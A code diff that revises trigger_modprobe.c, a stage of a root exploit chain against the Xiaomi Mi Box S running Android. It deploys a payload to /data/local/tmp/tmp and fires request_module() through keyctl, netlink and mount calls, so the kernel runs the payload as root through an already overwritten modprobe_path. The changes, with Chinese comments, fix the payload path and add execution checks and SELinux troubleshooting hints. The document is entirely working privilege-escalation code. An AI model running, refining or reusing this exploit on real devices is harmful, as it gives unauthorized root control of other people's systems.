@@ -1,19 +1,11 @@
 /*
  * trigger_modprobe.c - Robust multi-vector modprobe trigger (Mi Box S)
  *
- * modprobe_path has already been overwritten to "/tmp/tmp" by
- * kort_modprobe_2step (the only writable string with our 4-byte-repeat
- * BIND_MEM write primitive on a 64-bit kernel).
- *
- * This binary:
- *   1) deploys the root payload to BOTH
- *        /data/local/tmp/tmp   (always creatable; catches /tmp -> /data/local/tmp symlink)
- *        /tmp/tmp              (if /tmp is a real writable dir)
- *      so the kernel execs the payload as root when it calls modprobe_path.
- *   2) fires request_module() via every unprivileged vector we can reach
- *      under SELinux (keyctl is the most reliable - proven by the frels
- *      reference exploits which lean heavily on add_key/keyctl).
- *   3) reports whether rooted.txt appeared.
+ * [修复说明]
+ * 1. 移除了对根目录 /tmp 符号链接的无效创建（Android 根目录只读）。
+ * 2. 统一将 Payload 部署到 /data/local/tmp/tmp。
+ *    ★ 必须确保前置 Exploit 将 modprobe_path 覆写为 "/data/local/tmp/tmp"。
+ * 3. 增强了 Payload 部署后的可执行权限检查。
  *
  * Build (NDK 21.4, 32-bit armeabi-v7a, static):
  *   %CLANG% trigger_modprobe.c -o trigger_modprobe -static
@@ -44,7 +36,7 @@
 #define __NR_keyctl     311
 #endif
 
-/* keyctl commands / special keyring ids (not relying on <linux/keyctl.h>) */
+/* keyctl commands / special keyring ids */
 #ifndef KEYCTL_SEARCH
 #define KEYCTL_SEARCH 10
 #endif
@@ -56,8 +48,13 @@ static int g_total = 0;
 static int copy_file(const char *src, const char *dst) {
     int in = open(src, O_RDONLY);
     if (in < 0) return -1;
+    
     int out = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0755);
-    if (out < 0) { close(in); return -1; }
+    if (out < 0) { 
+        close(in); 
+        return -1; 
+    }
+    
     char buf[4096];
     ssize_t n;
     while ((n = read(in, buf, sizeof(buf))) > 0) {
@@ -76,40 +73,34 @@ static int copy_file(const char *src, const char *dst) {
 
 static void deploy_payload(void) {
     const char *src = "/data/local/tmp/x_payload";
-     // ★ 关键修复：确保 /tmp -> /data/local/tmp 符号链接存在
-    struct stat st;
-    if (lstat("/tmp", &st) != 0) {
-        printf("  [deploy] /tmp missing, creating symlink...\n");
-        if (symlink("/data/local/tmp", "/tmp") == 0) {
-            printf("  [deploy] symlink /tmp -> /data/local/tmp OK\n");
-        } else {
-            printf("  [deploy] symlink FAILED (%s) - exploit will likely fail\n", strerror(errno));
-            // 即使失败也继续，让后续报告诊断
-        }
+    // ★ 核心修复：统一使用可写路径，确保与 modprobe_path 覆写目标一致
+    const char *dst = "/data/local/tmp/tmp"; 
+
+    printf("  [deploy] Copying %s -> %s\n", src, dst);
+    if (copy_file(src, dst) == 0) {
+        printf("  [deploy] -> %s OK\n", dst);
+    } else {
+        printf("  [deploy] -> %s FAILED (%s)\n", dst, strerror(errno));
+        printf("  [!] CRITICAL: Payload deployment failed.\n");
+        return;
     }
 
-
-    /* Always create at /data/local/tmp/tmp.
-     * If /tmp is a symlink to /data/local/tmp, then the kernel's "/tmp/tmp"
-     * resolves exactly here and the payload runs. */
-    if (copy_file(src, "/data/local/tmp/tmp") == 0)
-        printf("  [deploy] -> /data/local/tmp/tmp OK\n");
-    else
-        printf("  [deploy] -> /data/local/tmp/tmp FAILED (%s)\n", strerror(errno));
-
-    /* Also try a real /tmp/tmp in case /tmp is an actual writable directory. */
-    if (copy_file(src, "/tmp/tmp") == 0)
-        printf("  [deploy] -> /tmp/tmp OK\n");
-    else
-        printf("  [deploy] -> /tmp/tmp not possible (this is fine if /tmp is a symlink)\n");
+    // 验证文件是否成功部署且具备可执行权限
+    struct stat st;
+    if (stat(dst, &st) == 0) {
+        if (st.st_mode & S_IXUSR) {
+            printf("  [verify] %s exists and is executable (size: %d bytes)\n", dst, (int)st.st_size);
+        } else {
+            printf("  [verify] WARNING: %s exists but is NOT executable!\n", dst);
+        }
+    } else {
+        printf("  [verify] FAILED: %s does not exist after copy!\n", dst);
+    }
 }
 
 /* ---- trigger vectors ---- */
 
-/* Most reliable unprivileged request_module source under SELinux.
- * A non-existent key *type* makes the kernel call
- *   request_module("key-type-<type>")
- * which invokes our overwritten modprobe_path. */
+/* Most reliable unprivileged request_module source under SELinux. */
 static int try_keyctl_triggers(void) {
     int count = 0;
     const char *bogus = "kort_zzz_12345";
@@ -150,9 +141,7 @@ static int try_netlink_triggers(void) {
     return count;
 }
 
-/* mount() of an unknown fstype normally triggers request_module("fs-<type>"),
- * but under SELinux shell it is usually blocked before reaching the module
- * path. Kept only as a best-effort attempt. */
+/* mount() of an unknown fstype normally triggers request_module("fs-<type>") */
 static int try_mount_triggers(void) {
     int count = 0;
     const char *fstypes[] = {
@@ -168,30 +157,24 @@ static int try_mount_triggers(void) {
     return count;
 }
 
-static void report_tmp(void) {
+/* 优化后的状态报告：直接检查实际执行路径 */
+static void report_status(void) {
     struct stat st;
-    printf("\n[*] /tmp status:\n");
-    if (lstat("/tmp", &st) == 0) {
-        if (S_ISLNK(st.st_mode)) {
-            char link[256] = {0};
-            readlink("/tmp", link, sizeof(link)-1);
-            printf("    /tmp is a SYMLINK -> %s\n", link);
-            printf("    => kernel '/tmp/tmp' resolves to %s/tmp\n", link);
-        } else if (S_ISDIR(st.st_mode)) {
-            printf("    /tmp is a DIRECTORY (mode 0%o)\n", st.st_mode & 0777);
-        } else {
-            printf("    /tmp is something else (mode 0%o)\n", st.st_mode & 0777);
-        }
+    const char *exec_path = "/data/local/tmp/tmp";
+    
+    printf("\n[*] Execution Path Status:\n");
+    if (stat(exec_path, &st) == 0) {
+        printf("    %s EXISTS (mode: 0%o, size: %d bytes)\n", 
+               exec_path, st.st_mode & 0777, (int)st.st_size);
     } else {
-        printf("    /tmp does NOT exist -> exploit CANNOT deliver payload here\n");
-        printf("    (need /tmp -> /data/local/tmp symlink, or arbitrary-write primitive)\n");
+        printf("    %s DOES NOT EXIST -> Kernel cannot execute payload!\n", exec_path);
     }
 }
 
 int main(void) {
     setvbuf(stdout, NULL, _IONBF, 0);
-    printf("[*] Mi Box S modprobe trigger\n");
-    printf("[*] modprobe_path should already be \"/tmp/tmp\"\n\n");
+    printf("[*] Mi Box S modprobe trigger (Fixed)\n");
+    printf("[*] Expected modprobe_path: \"/data/local/tmp/tmp\"\n\n");
 
     printf("[*] Deploying root payload...\n");
     deploy_payload();
@@ -219,7 +202,7 @@ int main(void) {
     /* give the async usermodehelper time to run */
     sleep(3);
 
-    report_tmp();
+    report_status();
 
     struct stat st;
     if (stat("/data/local/tmp/rooted.txt", &st) == 0) {
@@ -235,9 +218,10 @@ int main(void) {
         printf("[+] CHAIN WORKS - you have root via modprobe_path\n");
     } else {
         printf("\n[-] rooted.txt not found yet.\n");
-        printf("    Next: confirm /tmp exists; if not, the BIND_MEM primitive\n");
-        printf("    cannot write an arbitrary path on 64-bit -> need arbitrary-write\n");
-        printf("    (per-pixel shader, or pivot to the Mali UAF+spray bug).\n");
+        printf("    Troubleshooting:\n");
+        printf("    1. Ensure modprobe_path was overwritten to '/data/local/tmp/tmp'.\n");
+        printf("    2. Check dmesg for SELinux denials (avc: denied) blocking execution.\n");
+        printf("    3. Verify /data/local/tmp/x_payload is a valid static ARM32 binary.\n");
     }
     return 0;
 }
